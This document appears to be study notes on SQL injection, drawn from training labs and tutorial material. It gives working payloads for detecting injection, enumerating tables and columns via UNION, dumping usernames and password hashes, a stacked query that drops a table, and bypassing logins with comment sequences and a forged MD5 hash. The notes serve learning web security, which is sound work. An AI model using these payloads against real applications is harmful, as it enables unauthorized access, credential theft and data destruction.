SQL INJECTION

How to detect SQL injection vulnerabilities
‘ 
enter in user id to know if the application is vulnerable to SQL query, giving us a SQL syntax error meaning the data from the field is given to SQL query without any validation,… providing us with the =information that we can manipulate the input and get the data from database.
The majority of SQL injection vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner.
SQL injection can be detected manually by using a systematic set of tests against every entry point in the application. This typically involves:
•	Submitting the single quote character ' and looking for errors or other anomalies.
•	Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
•	Submitting Boolean conditions such as OR 1=1 and OR 1=2, and looking for differences in the application's responses.
•	Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
•	Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.
--,# used to comment helps in passing the query after these the query is ignored
1’ and 1=1#
To check if and condition has any effect on the input, when both the condition is true use and
When one condition is true, the SQL statement will look like this:
SELECT * FROM Users WHERE UserId = 1’ OR 1=1 The SQL above is valid and will return ALL rows from the "Users" table, since or 1=1 is always TRUE

we append the SQL query to try and get the data from the database
UNION Injections
1’ and 1=1 union select database(), user()#
With union you do SQL queries cross-table. Basically you can poison query to return records from another tab, This will combine results from both news table and members table and return all of them.
1’ and 1=1 union select null, table_name from information_schema.tables#
This represent the first name can be null and then some table_name
In MySQL information_schema holds the information about all the table
Gives the output as 
The SQL query passed as ID – cause of the input field
First name:        - as we specified first_name can be null
Surname: table_name – we get all the table names
We can modify the query to have different first name to giving more varied output like
….. union select 1,table_name from information_schema.tables# - same but here first_name  be 1
We got the table names to get the column names in a particular table we can use-
1’ and 1=1 union select null,column_name from information_schema.columns#
this we provide us with the column names in the table we can further look for

From here we get the result and finds there’s a table with name user which might contain username and password
We change the SQL query to get the same
1’ and 1=1 union select user, password from users#
Gives the output as
ID: ….. – our SQL query
First Name: first_name_of_users
Surname: Password of the same user but hash encrypted

Executing more than one query in one transaction. 
This is very useful in every injection point, especially in SQL Server back ended applications.
; 
SELECT * FROM members; DROP members--
Ends a query and starts a new one.

Bypassing second MD5 hash check login screens
If application is first getting the record by username and then compare returned MD5 with supplied password's MD5 then you need to some extra tricks to fool application to bypass authentication. You can union results with a known password and MD5 hash of supplied password. In this case application will compare your password and your supplied MD5 hash instead of MD5 from database.
Earlier we got-
ID: ….. – our SQL query
First Name: first_name_of_users
Surname: Password of the same user but hash encrypted
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
Bypassing MD5 Hash Check Example (MSP)
ID: admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
First Name : admin 
Password : 1234
As 81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)

Subverting application logic
Consider an application that lets users log in with a username and password. If a user submits the username wiener and the password bluecheese, the application checks the credentials by performing the following SQL query:
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.
Here, an attacker can log in as any user without a password simply by using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator'-- and a blank password results in the following query:
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
This query returns the user whose username is administrator and successfully logs the attacker in as that user.

Retrieving data from other database tables
In cases where the results of an SQL query are returned within the application's responses, an attacker can leverage an SQL injection vulnerability to retrieve data from other tables within the database. This is done using the UNION keyword, which lets you execute an additional SELECT query and append the results to the original query.
For example, if an application executes the following query containing the user input "Gifts":
SELECT name, description FROM products WHERE category = 'Gifts'
then an attacker can submit the input:
' UNION SELECT username, password FROM users--
This will cause the application to return all usernames and passwords along with the names and descriptions of products.

Hints,
•	Always use UNION with ALL because of image similar non-distinct field types. By default union tries to get records with distinct.
•	To get rid of unrequired records from left table use -1 or any not exist record search in the beginning of query (if injection is in WHERE). This can be critical if you are only getting one result at a time.
•	Use NULL in UNION injections for most data type instead of trying to guess string, date, integer etc.
•	Be careful in Blind situtaions may you can understand error is coming from DB or application itself. Because languages like ASP.NET generally throws errors while trying to use NULL values (because normally developers are not expecting to see NULL in a username field)

